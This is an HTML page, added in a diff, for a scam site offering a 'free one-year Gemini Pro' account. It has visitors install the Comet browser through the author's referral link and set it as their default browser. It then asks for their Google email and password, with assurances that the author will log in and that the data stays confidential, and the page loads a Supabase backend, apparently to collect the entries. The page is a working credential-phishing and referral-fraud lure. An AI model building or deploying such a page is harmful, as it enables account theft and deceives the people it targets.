@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gemini Pro 1 Năm Miễn Phí - Neo-brutalism</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Language Switcher & Admin Access -->
+    <div class="top-bar">
+        <div class="admin-access">
+            <button class="admin-btn" onclick="toggleAdminLogin()">🔐 Admin</button>
+        </div>
+    </div>
+
+    <!-- Admin Login Popup -->
+    <div class="admin-login-popup" id="adminLoginPopup">
+        <div class="admin-login-card">
+            <h3>🔐 Admin Access</h3>
+            <input 
+                type="password" 
+                id="adminPassword" 
+                class="admin-input" 
+                placeholder="Enter admin password..."
+                onkeypress="if(event.key === 'Enter') adminLogin()"
+            >
+            <button class="btn btn-primary" onclick="adminLogin()">Login</button>
+            <button class="btn btn-secondary" onclick="toggleAdminLogin()">✕ Close</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <h1 class="header-title">GEMINI PRO FREE</h1>
+            <p class="header-subtitle">Get 1 year free account</p>
+        </header>
+
+        <!-- Progress Bar -->
+        <div class="progress-container">
+            <div class="progress-step active" data-step="1">
+                <div class="progress-circle">1</div>
+                <div class="progress-label">Introduction</div>
+            </div>
+            <div class="progress-line"></div>
+            <div class="progress-step" data-step="2">
+                <div class="progress-circle">2</div>
+                <div class="progress-label">Instructions</div>
+            </div>
+            <div class="progress-line"></div>
+            <div class="progress-step" data-step="3">
+                <div class="progress-circle">3</div>
+                <div class="progress-label">Information</div>
+            </div>
+            <div class="progress-line"></div>
+            <div class="progress-step" data-step="4">
+                <div class="progress-circle">4</div>
+                <div class="progress-label">Complete</div>
+            </div>
+        </div>
+
+        <!-- Step 1: Introduction -->
+        <div class="step-container active" data-step="1">
+            <div class="card">
+                <div class="card-header">
+                    <h2>👋 Welcome!</h2>
+                </div>
+                <div class="card-body">
+                    <div class="info-box">
+                        <p class="large-text">
+                            I created this website to help those who haven't been able to register for <strong>Gemini Pro 1 year account</strong>, but before receiving the benefits, please help me complete a few small tasks.
+                        </p>
+                        <div class="highlight-box">
+                            <p>
+                                ✨ This is a small invited program, when you complete it I will receive a small commission. After that you will receive a <strong>GEMINI PRO 1 year package</strong>.
+                            </p>
+                        </div>
+                        <p class="thank-you">THANK YOU VERY MUCH! 💝</p>
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <button class="btn btn-primary" onclick="nextStep()">
+                        Get Started →
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 2: Instructions -->
+        <div class="step-container" data-step="2">
+            <div class="card">
+                <div class="card-header">
+                    <h2>📋 Detailed Instructions</h2>
+                </div>
+                <div class="card-body">
+                    <div class="alert alert-warning">
+                        <strong>⚠️ Note:</strong> If you have downloaded the Comet browser before, unfortunately this program is not for you yet.
+                    </div>
+                    
+                    <div class="alert alert-info">
+                        <strong>💻 Important:</strong> Please use a computer to complete the requirements, as this is desktop software.
+                    </div>
+                    
+                    <p class="instruction-intro">Please follow these steps:</p>
+                    
+                    <div class="instruction-box">
+                        <div class="instruction-number">1</div>
+                        <div class="instruction-content">
+                            <h3>Access link and download Comet</h3>
+                            <p>Click the button below to access the download link</p>
+                            <a href="https://pplx.ai/kiru23" target="_blank" class="btn btn-secondary btn-link">
+                                🔗 Access Comet download link
+                            </a>
+                        </div>
+                    </div>
+
+                    <div class="instruction-box">
+                        <div class="instruction-number">2</div>
+                        <div class="instruction-content">
+                            <h3>Login to Comet</h3>
+                            <p>Login to Comet using the same Google account you clicked the link with</p>
+                        </div>
+                    </div>
+
+                    <div class="instruction-box">
+                        <div class="instruction-number">3</div>
+                        <div class="instruction-content">
+                            <h3>Use Comet</h3>
+                            <p>Open Comet browser and ask a few random questions</p>
+                        </div>
+                    </div>
+
+                    <div class="instruction-box">
+                        <div class="instruction-number">4</div>
+                        <div class="instruction-content">
+                            <h3>Set as default</h3>
+                            <p>Set Comet as your default browser</p>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-info">
+                        <strong>📌 Note:</strong> After completion, if correct and successful, I will be able to confirm and will immediately complete the Gemini PRO account for you.
+                    </div>
+
+                    <div class="checkbox-container">
+                        <label class="checkbox-label">
+                            <input type="checkbox" id="confirmSteps" class="checkbox-input">
+                            <span class="checkbox-custom"></span>
+                            <span class="checkbox-text">I have completed all the steps above</span>
+                        </label>
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <button class="btn btn-secondary" onclick="previousStep()">
+                        ← Back
+                    </button>
+                    <button class="btn btn-primary" id="continueBtn" onclick="nextStep()" disabled>
+                        Continue →
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 3: User Information -->
+        <div class="step-container" data-step="3">
+            <div class="card">
+                <div class="card-header">
+                    <h2>📝 Account Information</h2>
+                </div>
+                <div class="card-body">
+                    <p class="form-intro">Please enter your Google account information to receive Gemini Pro:</p>
+                    
+                    <div class="alert alert-info">
+                        <strong>💡 Important note:</strong> Please help me create a new Google account (you can use your phone to create one)
+                    </div>
+                    
+                    <div class="alert alert-success">
+                        <strong>🔒 Security:</strong> I will login to the account and help you activate it, you can change the password immediately after.
+                    </div>
+                    
+                    <form id="userForm" class="form">
+                        <div class="form-group">
+                            <label for="email" class="form-label">Google Email *</label>
+                            <input 
+                                type="email" 
+                                id="email" 
+                                class="form-input" 
+                                placeholder="example@gmail.com"
+                                required
+                            >
+                            <span class="form-hint">The Google account email you used</span>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="password" class="form-label">Password *</label>
+                            <div class="password-wrapper">
+                                <input 
+                                    type="password" 
+                                    id="password" 
+                                    class="form-input" 
+                                    placeholder="Enter password"
+                                    required
+                                >
+                                <button type="button" class="toggle-password" onclick="togglePassword()">
+                                    👁️
+                                </button>
+                            </div>
+                            <span class="form-hint">Your Google account password</span>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="contactEmail" class="form-label">Contact Email *</label>
+                            <input 
+                                type="email" 
+                                id="contactEmail" 
+                                class="form-input" 
+                                placeholder="contact@example.com"
+                                required
+                            >
+                            <span class="form-hint">Email for us to contact you</span>
+                        </div>
+
+                        <div class="alert alert-warning">
+                            <strong>⚠️ Important:</strong> Your information will be kept strictly confidential and only used to activate Gemini Pro for your account.
+                        </div>
+                    </form>
+                </div>
+                <div class="card-footer">
+                    <button class="btn btn-secondary" onclick="previousStep()">
+                        ← Back
+                    </button>
+                    <button class="btn btn-primary" onclick="submitForm()">
+                        Confirm →
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 4: Success -->
+        <div class="step-container" data-step="4">
+            <div class="card">
+                <div class="card-header success">
+                    <h2>✅ Complete!</h2>
+                </div>
+                <div class="card-body text-center">
+                    <div class="success-animation">
+                        <div class="success-icon">🎉</div>
+                    </div>
+                    <h3 class="success-title">Thank you for completing!</h3>
+                    <p class="success-message">
+                        We have received your information. Your Gemini Pro 1 year account will be activated within <strong>10-20 minutes</strong>.
+                    </p>
+                    <div class="alert alert-success">
+                        <p>📧 You will receive a confirmation email once the account is successfully activated.</p>
+                    </div>
+                    <div class="info-box">
+                        <p><strong>Note:</strong></p>
+                        <ul class="info-list">
+                            <li>Check your email after 10-20 minutes</li>
+                            <li>If there are any issues, we will contact you via the email you provided</li>
+                            <li>Thank you for your trust and support!</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <button class="btn btn-primary full-width" onclick="resetForm()">
+                        🏠 Go to homepage
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>© 2025 Gemini Pro Free. Made with ❤️</p>
+        </footer>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <p class="loading-text">Processing...</p>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="config.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
+
